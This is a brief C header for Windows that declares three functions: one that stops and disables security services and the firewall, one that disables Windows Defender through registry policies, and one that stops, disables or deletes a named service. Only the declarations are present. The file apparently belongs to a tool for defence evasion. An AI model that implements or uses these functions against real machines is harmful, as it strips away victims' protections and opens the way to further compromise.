#pragma once
#include <windows.h>

/* Stop and disable security services + firewall */
void KillSecurity(void);

/* Disable Windows Defender via registry policies */
void DisableDefender(void);

/* Manage a single service (stop, disable, delete) */
void ManageService(const char *svcName);